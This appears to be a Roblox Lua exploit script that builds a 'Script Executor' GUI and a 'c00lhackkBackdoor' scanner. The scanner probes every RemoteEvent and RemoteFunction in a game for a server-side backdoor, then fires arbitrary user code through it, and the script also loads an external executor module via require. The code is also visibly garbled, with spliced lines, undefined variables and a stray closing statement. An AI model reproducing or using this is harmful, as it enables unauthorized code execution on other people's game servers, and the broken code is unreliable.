-- Services
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

-- Main UI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "CustomExecutorUI"
ScreenGui.Parent = PlayerGui

-- Icon for UI
local Icon = Instance.new("ImageLabel")
Icon.Name = "Icon"
Icon.Size = UDim2.new(0, 50, 0, 50)
Icon.Position = UDim2.new(0, 15, 0, 15)
Icon.BackgroundTransparency = 1
Icon.Image = "rbxassetid://12345678" -- Replace with your image asset ID
Icon.Parent = ScreenGui

-- UDim2.new(0.25, 0, 0.2, 0) -- Centered
MainFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
MainFrame.BorderSizePixel = 0
MainFrame.Parent = ScreenGui

-- Title Bar
local TitleBar.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
TitleBar.Text = "Script Executor"
TitleBar.TextColor3 = Color3.fromRGB(255, 255, 255)
TitleBar.TextScaled = true
TitleBar.Font = Enum.Font.SourceSansBold
TitleBar.Parent = Main height
ScriptSection.Position = UDim2.new(0.025, 0, 0.15, 0) -- Slightly inset
ScriptSection.CanvasSize = UDim2.new(0, 0, 5, 0)
ScriptSection.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
ScriptSection.BorderSizePixel = 0
ScriptSection.Parent = MainFrame

-- TextBox for Script Input
local ScriptBox = Instance.new("TextBox")
ScriptBox.Name = "ScriptBox"
ScriptBox.Size = UDim2.new(0.95, 0, 0.15, 0) -- 95% width, 15% height
ScriptBox.Position = UDim2.new(0.025, 0, 0.8, 0)
ScriptBox.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
ScriptBox.Text = "-- Enter your script here"
ScriptBox.TextSize = 14
ScriptBox.TextColor3 = Color3.fromRGB(255, 255, 255)
ScriptBox.Font = Enum.Font.SourceSans
ScriptBox.MultiLine = true
ScriptBox.Parent = MainFrame

-- Execute Button
local ExecuteButton = Instance.new("TextButton")
ExecuteButton.Name = "ExecuteButton"
ExecuteButton.Size = UDim2.new(0.3, 0, 0.1, 0) -- 30% width, 10% height
ExecuteButton.Position = UDim2.new(0.05, 0, ExecuteButton.BackgroundColor3 = Color3.fromRGB(0, 128, 0) -- Green
ExecuteButton.Text = "Execute"
ExecuteButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ExecuteButton.TextScaled = true
ExecuteButton.Font = Enum.Font.SourceSansBold
ExecuteButton.Parent = MainFrame

-- Clear Button
local ClearButton = Instance.new("TextButton")
ClearButton.Name = "ClearButton"
ClearButton.Size = UDim2.new(0.3, 0, 0.1, 0) -- 30% width, 10% height
ClearButton.Position = UDim2.new(0.35, 0, 0.95, 0) -- Bottom-center
ClearButton.BackgroundColor3 = Color3.fromRGB(128, 0, 0) -- Red
ClearButton.Text = "Clear"
ClearButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ClearButton.TextScaled = true
ClearButton.Font = Enum.Font.SourceSansBold
ClearButton.Parent = MainFrame

-- Scan Button
local ScanButton = Instance.new("TextButton")
ScanButton.Name = "ScanButton"
ScanButton.Size = UDim2.new(0.3, 0, 0.1, 0) -- 30% width, 10% height
ScanButton.Position = UDim2.new(0.65, 0, 0.95, 0) -- Bottom-right
ScanButton.BackgroundColor3 = Color3.fromRGB(0, 0, 128) -- Blue
ScanButton.Text = "Scan"
ScanButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ScanButton.TextScaled = true
ScanButton.Font = Enum.Font.SourceSansBold
ScanButton.Parent = MainFrame

-- Script Button Template
local ScriptButtonTemplate = Instance.new("TextButton")
ScriptButtonTemplate.Name = "ScriptButtonTemplate"
ScriptButtonTemplate.Size = UDim2.new(0.9, 0, 0, 30) -- Buttons for scripts
ScriptButtonTemplate.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
ScriptButtonTemplate.TextColor3 = Color3.fromRGB(255, 255, 255)
ScriptButtonTemplate.TextScaled = true
ScriptButtonTemplate.Font = Enum.Font.SourceSans

-- Add Scripts Dynamically
local scripts = {
    { Name = "Hello World", Code = "print('Hello, World!')" },
    { Name = "Loop Example", Code = "for i = 1, 10 do print(i) end" },
    { Name = "Wait Example", Code = "wait(5)\nprint('Waited 5 seconds')" },
}

for _, script in ipairs(scripts) do
    local ScriptButton = ScriptButtonTemplate:Clone()
    ScriptButton.Text = server side executor require script
    ScriptButton.Parent = ScriptSection

    -- Add functionality to place script into ScriptBox
    ScriptButton.MouseButton1Click:Connect(function()
        ScriptBox.Text = require(10868847330):pls("YourUsername")
    end)
end

-- Button Functionalities
ExecuteButton.MouseButton1Click:Connect(function()
	-- Fetch code from TextBox.
	local ScriptBox = ScriptBox.Text
	local InvokeFunc = Instance.new("BindableEvent")
	InvokeFunc.Event:Connect(function(rfunc,codestr2)
		-- This invokes the RemoteFunction without waiting.
		rfunc:InvokeServer(codestr2)
	end)
	local function DeepFire(inst)
		if not IsAcquiring then 
		if AcquiredRemote == nil then 
		-- Search every descendant of DataModel.
		for _, childy in inst:GetChildren() do
			-- We don't want remotes from RobloxReplicatedStorage!
			if childy.Parent ~= game:GetService('RobloxReplicatedStorage') then
				-- Check the class of the descendant.
				if childy:IsA("RemoteEvent") then
					-- If it is a RemoteEvent, fire it with code!
					print("c00lhackkBackdoor // Running "..childy.ClassName..' "'..childy.Name..'".')
					childy:FireServer(CodeStr)
				elseif childy:IsA("RemoteFunction") then
					-- Else if it is a RemoteFunction, invoke it with code!
					print("c00lhackkBackdoor // Running "..childy.ClassName..' "'..childy.Name..'".')
					InvokeFunc:Fire(childy, CodeStr)
				end
			end
				-- Keep looping through descendants, until dead end.
			DeepFire(childy)
		end 
		else 
		if AcquiredRemote:IsA("RemoteEvent") then 
			AcquiredRemote:FireServer(CodeStr) 
		elseif AcquiredRemote:IsA("RemoteFunction") then 
			task.spawn(function() AcquiredRemote:InvokeServer(CodeStr) end) 
		end
		end 
		end
	end
	-- Call the function!
	warn("c00lhackkBackdoor // Running all remotes with code:\n"..CodeStr)
	DeepFire(game)
end)


ClearButton.MouseButton1Click:Connect(function()
    ScriptBox.Text = ""
    print("Script Box Cleared")
end)

ScanButton.MouseButton1Click:Connect(function()
    print("Scanning...")
 local RemoteList = {} 
	local CurrentRemote = nil 
	local isFound = false
	if not isAcquiring then 
		isAcquiring = true 
		warn('c00lhackkBackdoor // Scanning Started!') 
		Cody.Text = '-- Please wait, while we are scanning the remotes.'
		for i,v in pairs(game:GetDescendants()) do 
			if v.Parent ~= game:GetService('RobloxReplicatedStorage') then 
				if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then 
					debug('Getting '..v.ClassName..' "'..v.Name..'" into RemoteList.')
					table.insert(RemoteList,v) 
				end 
			end
		end 
		for a,b in pairs(RemoteList) do
			if AcquiredRemote == nil then 
				print("c00lhackkBackdoor // Checking "..b.ClassName..' "'..b.Name..'".') 
				local NeededNameOfModel = string.char(math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A)) 
				local NeededCode = 'Instance.new("Model",workspace).Name="'..NeededNameOfModel ..'"'
				CurrentRemote = b 
				if b.Parent ~= game:GetService('RobloxReplicatedStorage') then 
					if b:IsA('RemoteEvent') then 
						debug('Fired')
						b:FireServer(NeededCode) 
					elseif b:IsA('RemoteFunction') then 
						debug('Invoked')
						task.spawn(function() b:InvokeServer(NeededCode) end) 
					end 
				end 
				debug('Awaiting')
				wait(2.5) 
				if workspace:FindFirstChild(NeededNameOfModel) then 
					debug('Detected')
					if workspace:FindFirstChild(NeededNameOfModel):IsA("Model") then 
						debug('Success')
						AcquiredRemote = b
					end 
				end 
			end 
		end 	
		if AcquiredRemote ~= nil then 
			isFound = true 
			ScriptBox.Text = '-- backdoor found! :D' 
			warn('c00lhackkBackdoor // backdoor found! :D')
		else 
			isFound = false 
			ScriptBox.Text = '-- backdoor Not found! :(. :(' 
			warn('c00lhackkBackdoor // backdoor Not found. :(')
		end 
		isAcquiring = false 
	end 
end)

end)